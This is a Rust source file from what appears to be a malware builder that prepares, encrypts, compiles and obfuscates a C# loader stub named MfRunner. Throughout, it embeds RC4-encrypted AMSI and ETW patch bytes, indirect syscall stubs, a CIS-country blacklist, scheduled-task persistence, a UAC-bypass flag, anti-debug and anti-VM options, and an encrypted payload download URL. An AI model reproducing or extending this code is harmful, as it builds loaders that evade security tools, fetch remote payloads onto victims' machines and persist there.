use std::{fs, path::Path, process::Command};

use colored::{Color, Colorize};
use rand::{rngs::OsRng, Rng, RngCore};

use crate::{binary_arch::BinaryArch, crypto::{cipher_rc4, derive_key::derive_key}, dir_utils, h, random, MfBuilder};

pub struct MfStubCS {
    pub working_directory: String,
    pub potential_seeds: Vec<u8>,
    pub key_starting_state: Vec<u8>,

    pub payload_key: Vec<u8>,
    pub shellcode_url_key: Vec<u8>,

    pub mf_runner_exe_bytes: Vec<u8>
}

impl MfStubCS {
    pub fn new() -> MfStubCS {
        let wd = random::guid();
        fs::create_dir(&wd).unwrap();
        println!("{}{}", h(), "Creating working directory...".color(Color::Yellow));
        dir_utils::copy_dir_all(Path::new("MfRunner"), Path::new(&wd)).unwrap();

        println!("{}{}{}", h(), "Working directory:   ".color(Color::Yellow), (&wd).color(Color::Blue));
        println!("{}", "---".color(Color::White));

        MfStubCS {
            working_directory: wd,
            potential_seeds: (0..255).collect(),
            key_starting_state: Vec::new(),

            payload_key: Vec::new(),
            shellcode_url_key: Vec::new(),
            
            mf_runner_exe_bytes: Vec::new()
        }
    }

    pub fn init_keys(&mut self) {
        println!("{}{}", h(), "Initializing encryption keys...".color(Color::Yellow));

        let mut i = OsRng::next_u32(&mut OsRng) as usize % self.potential_seeds.len();
        let seed_payload_url = self.potential_seeds[i];
        self.potential_seeds.remove(i);

        i = OsRng::next_u32(&mut OsRng) as usize % self.potential_seeds.len();
        let seed_cis_countries_list = self.potential_seeds[i];
        self.potential_seeds.remove(i);

        i = OsRng::next_u32(&mut OsRng) as usize % self.potential_seeds.len();
        let seed_amsi_patch = self.potential_seeds[i];
        self.potential_seeds.remove(i);

        i = OsRng::next_u32(&mut OsRng) as usize % self.potential_seeds.len();
        let seed_etw_patch = self.potential_seeds[i];
        self.potential_seeds.remove(i);

        i = OsRng::next_u32(&mut OsRng) as usize % self.potential_seeds.len();
        let seed_syscall_stub = self.potential_seeds[i];
        self.potential_seeds.remove(i);

        i = OsRng::next_u32(&mut OsRng) as usize % self.potential_seeds.len();
        let seed_payload = self.potential_seeds[i];
        
        let mut cis_countries_list_bytes = vec![5, 7, 29, 130, 137, 152, 203, 228, 238, 247];
        let mut amsi_patch_bytes = vec![144, 144, 144, 144, 144, 144, 144, 144, 49, 192, 195];
        let mut etw_patch_bytes = vec![144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 195];
        let mut x64_syscall_stub_bytes = vec![76, 139, 209, 184, 0, 0, 0, 0, 73, 187, 0, 0, 0, 0, 0, 0, 0, 0, 65, 255, 227];
        let mut x86_syscall_stub_bytes = vec![184, 0, 0, 0, 0, 187, 0, 0, 0, 0, 255, 227];

        let mut starting_state = vec![0u8; 32];
        OsRng::fill_bytes(&mut OsRng, &mut starting_state);
        self.key_starting_state = starting_state;

        println!("{}{}{}", h(), "Key starting state:  ".color(Color::Yellow), hex::encode(&self.key_starting_state).color(Color::Blue));
        println!("{}{}{}", h(), "Seed(Payload URL):   ".color(Color::Yellow), format!("{:#04x}", seed_payload_url).color(Color::Blue));
        println!("{}{}{}", h(), "Seed(Payload):       ".color(Color::Yellow), format!("{:#04x}", seed_payload).color(Color::Blue));
        println!("{}{}{}", h(), "Seed(CIS Countries): ".color(Color::Yellow), format!("{:#04x}", seed_cis_countries_list).color(Color::Blue));
        println!("{}{}{}", h(), "Seed(AMSI Patch):    ".color(Color::Yellow), format!("{:#04x}", seed_amsi_patch).color(Color::Blue));
        println!("{}{}{}", h(), "Seed(ETW Patch):     ".color(Color::Yellow), format!("{:#04x}", seed_etw_patch).color(Color::Blue));
        println!("{}{}{}", h(), "Seed(Syscall Stub):  ".color(Color::Yellow), format!("{:#04x}", seed_syscall_stub).color(Color::Blue));

        cipher_rc4::RC4::new(&derive_key(&self.key_starting_state, seed_cis_countries_list)).cipher(&mut cis_countries_list_bytes);
        cipher_rc4::RC4::new(&derive_key(&self.key_starting_state, seed_amsi_patch)).cipher(&mut amsi_patch_bytes);
        cipher_rc4::RC4::new(&derive_key(&self.key_starting_state, seed_etw_patch)).cipher(&mut etw_patch_bytes);
        cipher_rc4::RC4::new(&derive_key(&self.key_starting_state, seed_syscall_stub)).cipher(&mut x64_syscall_stub_bytes);
        cipher_rc4::RC4::new(&derive_key(&self.key_starting_state, seed_syscall_stub)).cipher(&mut x86_syscall_stub_bytes);

        self.payload_key = derive_key(&self.key_starting_state, seed_payload);
        self.shellcode_url_key = derive_key(&self.key_starting_state, seed_payload_url);

        let config_cs_path = self.working_directory.clone() + "\\config.cs";
        let mut config_cs_file = fs::read_to_string(&config_cs_path).unwrap();
        config_cs_file = config_cs_file.replace("0x01;", &format!("{};", seed_payload_url));
        config_cs_file = config_cs_file.replace("0x02;", &format!("{};", seed_cis_countries_list));
        config_cs_file = config_cs_file.replace("0x03;", &format!("{};", seed_amsi_patch));
        config_cs_file = config_cs_file.replace("0x04;", &format!("{};", seed_etw_patch));
        config_cs_file = config_cs_file.replace("0x05;", &format!("{};", seed_syscall_stub));
        config_cs_file = config_cs_file.replace("0x06;", &format!("{};", seed_payload));
        config_cs_file = config_cs_file.replace("0x00", &format!("{:?}", self.key_starting_state).replace("[", "").replace("]", ""));
        config_cs_file = config_cs_file.replace("RANDOM_MUTEX", &uuid::Uuid::new_v4().to_string());

        let anti_cis_file_path = self.working_directory.clone() + "\\anti\\anticis.cs";
        let mut anti_cis_file = fs::read_to_string(&anti_cis_file_path).unwrap();
        anti_cis_file = anti_cis_file.replace("5, 7, 29, 130, 137, 152, 203, 228, 238, 247", &format!("{:?}", cis_countries_list_bytes).replace("[", "").replace("]", ""));

        let patch_amsi_file_path = self.working_directory.clone() + "\\patches\\patchamsi.cs";
        let mut patch_amsi_file = fs::read_to_string(&patch_amsi_file_path).unwrap();
        patch_amsi_file = patch_amsi_file.replace("144, 144, 144, 144, 144, 144, 144, 144, 49, 192, 195", &format!("{:?}", amsi_patch_bytes).replace("[", "").replace("]", ""));

        let patch_etw_file_path = self.working_directory.clone() + "\\patches\\patchetw.cs";
        let mut patch_etw_file = fs::read_to_string(&patch_etw_file_path).unwrap();
        patch_etw_file = patch_etw_file.replace("144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 195", &format!("{:?}", etw_patch_bytes).replace("[", "").replace("]", ""));

        let patch_syscalls_file_path = self.working_directory.clone() + "\\native\\indirectsyscalls\\indirectsyscalls.cs";
        let mut patch_syscalls_file = fs::read_to_string(&patch_syscalls_file_path).unwrap();
        patch_syscalls_file = patch_syscalls_file.replace("76, 139, 209, 184, 0, 0, 0, 0, 73, 187, 0, 0, 0, 0, 0, 0, 0, 0, 65, 255, 227", &format!("{:?}", x64_syscall_stub_bytes).replace("[", "").replace("]", ""));
        patch_syscalls_file = patch_syscalls_file.replace("184, 0, 0, 0, 0, 187, 0, 0, 0, 0, 255, 227", &format!("{:?}", x86_syscall_stub_bytes).replace("[", "").replace("]", ""));

        fs::write(&config_cs_path, config_cs_file).unwrap();
        println!("{}{}{}", h(), "File updated:        ".color(Color::Yellow), "WorkingDirectory\\Config.cs".color(Color::Blue));
        fs::write(&anti_cis_file_path, anti_cis_file).unwrap();
        println!("{}{}{}", h(), "File updated:        ".color(Color::Yellow), "WorkingDirectory\\Anti\\AntiCIS.cs".color(Color::Blue));
        fs::write(&patch_amsi_file_path, patch_amsi_file).unwrap();
        println!("{}{}{}", h(), "File updated:        ".color(Color::Yellow), "WorkingDirectory\\Patches\\PatchAMSI.cs".color(Color::Blue));
        fs::write(&patch_etw_file_path, patch_etw_file).unwrap();
        println!("{}{}{}", h(), "File updated:        ".color(Color::Yellow), "WorkingDirectory\\Patches\\PatchETW.cs".color(Color::Blue));
        fs::write(&patch_syscalls_file_path, patch_syscalls_file).unwrap();
        println!("{}{}{}", h(), "File updated:        ".color(Color::Yellow), "WorkingDirectory\\Native\\IndirectSyscalls\\IndirectSyscalls.cs".color(Color::Blue));
        println!("{}", "---".color(Color::White));
    }

    pub fn init_persistance(&mut self) {
        let replace_timestamp = random::generate(OsRng.gen_range(10..=20));
        let replace_author = random::generate(OsRng.gen_range(10..=20));
        let replace_name = random::generate(OsRng.gen_range(10..=20));
        let replace_sid = random::generate(OsRng.gen_range(10..=20));
        let replace_command = random::generate(OsRng.gen_range(10..=20));
        
        println!("{}{}", h(), "Modifying persistance strings...".color(Color::Yellow));
        println!("{}{}{}", h(), "REPLACE_TIMESTAMP:   ".color(Color::Yellow), replace_timestamp.color(Color::Blue));
        println!("{}{}{}", h(), "REPLACE_AUTHOR:      ".color(Color::Yellow), replace_author.color(Color::Blue));
        println!("{}{}{}", h(), "REPLACE_NAME:        ".color(Color::Yellow), replace_name.color(Color::Blue));
        println!("{}{}{}", h(), "REPLACE_SID:         ".color(Color::Yellow), replace_sid.color(Color::Blue));
        println!("{}{}{}", h(), "REPLACE_COMMAND:     ".color(Color::Yellow), replace_command.color(Color::Blue));

        let persistance_file_path = self.working_directory.clone() + "\\utilities\\persistance\\persistance.cs";
        let template_admin_file_path = self.working_directory.clone() + "\\utilities\\persistance\\schtaskstemplateadmin.cs";
        let template_user_file_path = self.working_directory.clone() + "\\utilities\\persistance\\schtaskstemplateuser.cs";

        let mut persistance_file = fs::read_to_string(&persistance_file_path).unwrap();
        let mut template_admin_file = fs::read_to_string(&template_admin_file_path).unwrap();
        let mut template_user_file = fs::read_to_string(&template_user_file_path).unwrap();

        for file in [&mut persistance_file, &mut template_admin_file, &mut template_user_file] {
            *file = file.replace("REPLACE_TIMESTAMP", &replace_timestamp);
            *file = file.replace("REPLACE_AUTHOR", &replace_author);
            *file = file.replace("REPLACE_NAME", &replace_name);
            *file = file.replace("REPLACE_SID", &replace_sid);
            *file = file.replace("REPLACE_COMMAND", &replace_command);
        }

        fs::write(&persistance_file_path, persistance_file).unwrap();
        println!("{}{}{}", h(), "File updated:        ".color(Color::Yellow), "WorkingDirectory\\Utilities\\Persistance\\Persistance.cs".color(Color::Blue));
        fs::write(&template_admin_file_path, template_admin_file).unwrap();
        println!("{}{}{}", h(), "File updated:        ".color(Color::Yellow), "WorkingDirectory\\Utilities\\Persistance\\SchtasksTemplateAdmin.cs".color(Color::Blue));
        fs::write(&template_user_file_path, template_user_file).unwrap();
        println!("{}{}{}", h(), "File updated:        ".color(Color::Yellow), "WorkingDirectory\\Utilities\\Persistance\\SchtasksTemplateUser.cs".color(Color::Blue));
        
        println!("{}", "---".color(Color::White));
    }

    pub fn init_payload(&mut self, url: String) {
        let mut url_bytes = url.as_bytes().to_vec();
        cipher_rc4::RC4::new(&self.shellcode_url_key).cipher(&mut url_bytes);

        println!("{}{}{}", h(), "Payload URL:         ".color(Color::Yellow), hex::encode(&url_bytes).color(Color::Blue));

        let payload_download_file_path = self.working_directory.clone() + "\\utilities\\payloaddownloader.cs";
        let mut payload_download_file = fs::read_to_string(&payload_download_file_path).unwrap();
        payload_download_file = payload_download_file.replace("0x00", &format!("{:?}", url_bytes).replace("[", "").replace("]", ""));

        fs::write(&payload_download_file_path, payload_download_file).unwrap();
        println!("{}{}{}", h(), "File updated:        ".color(Color::Yellow), "WorkingDirectory\\Utilities\\PayloadDownloader.cs".color(Color::Blue));
        println!("{}", "---".color(Color::White));
    }

    pub fn set_symbols(&mut self, build_config: &MfBuilder) {
        println!("{}{}", h(), "Modifying preprocessor symbols...".color(Color::Yellow));
        
        let mut new_symbols = "NATIVE;ANTI_DEBUG;ANTI_VM;BLACKLIST_CIS;BYPASS_UAC;SINGLE_INSTANCE;PERSISTANCE;".to_string();

        if build_config.build_arch == BinaryArch::NET64 || build_config.build_arch == BinaryArch::NET86 {
            new_symbols = new_symbols.replace("NATIVE;", "");
        }
        if !build_config.anti_debug {
            new_symbols = new_symbols.replace("ANTI_DEBUG;", "");
        }
        if !build_config.anti_virtual_machine {
            new_symbols = new_symbols.replace("ANTI_VM;", "");
        }
        if !build_config.blacklist_cis_countries {
            new_symbols = new_symbols.replace("BLACKLIST_CIS;", "");
        }
        if !build_config.uac_bypass {
            new_symbols = new_symbols.replace("BYPASS_UAC;", "");
        }
        if !build_config.single_instance {
            new_symbols = new_symbols.replace("SINGLE_INSTANCE;", "");
        }
        if !build_config.run_on_startup {
            new_symbols = new_symbols.replace("PERSISTANCE;", "");
        }
        println!("{}{}{}", h(), "ANTI_DEBUG:          ".color(Color::Yellow), build_config.anti_debug.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
        println!("{}{}{}", h(), "ANTI_VM:             ".color(Color::Yellow), build_config.anti_virtual_machine.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
        println!("{}{}{}", h(), "BLACKLIST_CIS:       ".color(Color::Yellow), build_config.blacklist_cis_countries.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
        println!("{}{}{}", h(), "BYPASS_UAC:          ".color(Color::Yellow), build_config.uac_bypass.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
        println!("{}{}{}", h(), "SINGLE_INSTANCE:     ".color(Color::Yellow), build_config.single_instance.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
        println!("{}{}{}", h(), "PERSISTANCE:         ".color(Color::Yellow), build_config.run_on_startup.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
    
        let csproj_file_path = self.working_directory.clone() + "\\mfrunner.csproj";
        let mut csproj_file = fs::read_to_string(&csproj_file_path).unwrap();
        csproj_file = csproj_file.replace("NATIVE;ANTI_DEBUG;ANTI_VM;BLACKLIST_CIS;BYPASS_UAC;SINGLE_INSTANCE;PERSISTANCE;", &new_symbols);

        fs::write(&csproj_file_path, csproj_file).unwrap();
        println!("{}{}{}", h(), "File updated:        ".color(Color::Yellow), "WorkingDirectory\\MfRunner.csproj".color(Color::Blue));
        println!("{}", "---".color(Color::White));     
    }

    pub fn ms_build(&mut self, arch: BinaryArch) -> bool {
        println!("{}{}", h(), "Compiling MfRunner...".color(Color::Yellow));

        let s1: &str;
        let s2: &str;

        if arch == BinaryArch::X64 || arch == BinaryArch::NET64 {
            s1 = "/p:Platform=x64";
            s2 = "\\bin\\x64\\Release\\MfRunner.exe";
        } else {
            s1 = "/p:Platform=x86";
            s2 = "\\bin\\x86\\Release\\MfRunner.exe";
        }

        Command::new(r#"C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\amd64\MSBuild.exe"#).args([
            &(self.working_directory.clone() + "\\MfRunner.sln"), "/p:Configuration=Release", s1
        ]).spawn().unwrap().wait().unwrap();
        let success = fs::exists(self.working_directory.clone() + s2).unwrap();
        if success {
            self.mf_runner_exe_bytes = fs::read(self.working_directory.clone() + s2).unwrap();
            println!("{}{}", h(), "Successfully compiled MfRunner.exe".color(Color::Yellow));
        } else {
            println!("{}{}", h(), "Failed to compile MfRunner.exe".color(Color::BrightRed));
        }
        println!("{}", "---".color(Color::White));

        success
    }

    pub fn obfuscate_mf_runner(&mut self) {
        fs::write(self.working_directory.clone() + "\\MfRunner.exe", &self.mf_runner_exe_bytes).unwrap();
        println!("{}{}{}", h(), "File created:        ".color(Color::Yellow), "WorkingDirectory\\MfRunner.exe".color(Color::Blue));
        println!("{}{}", h(), "Obfuscating MfRunner...".color(Color::Yellow));
        Command::new("cmd.exe").args([
            "/c",
            "MfObfDotNet.exe",
            &(self.working_directory.clone() + "\\MfRunner.exe")
        ]).spawn().unwrap().wait().unwrap();
        println!("{}{}{}", h(), "File created:        ".color(Color::Yellow), "WorkingDirectory\\MfRunner.obf.exe".color(Color::Blue));
        

        self.mf_runner_exe_bytes = fs::read(self.working_directory.clone() + "\\MfRunner.obf.exe").unwrap();
        fs::remove_file(self.working_directory.clone() + "\\MfRunner.exe").unwrap();
        println!("{}{}{}", h(), "File deleted:        ".color(Color::Yellow), "WorkingDirectory\\MfRunner.exe".color(Color::Blue));
        fs::remove_file(self.working_directory.clone() + "\\MfRunner.obf.exe").unwrap();
        println!("{}{}{}", h(), "File deleted:        ".color(Color::Yellow), "WorkingDirectory\\MfRunner.obf.exe".color(Color::Blue));
    }
}
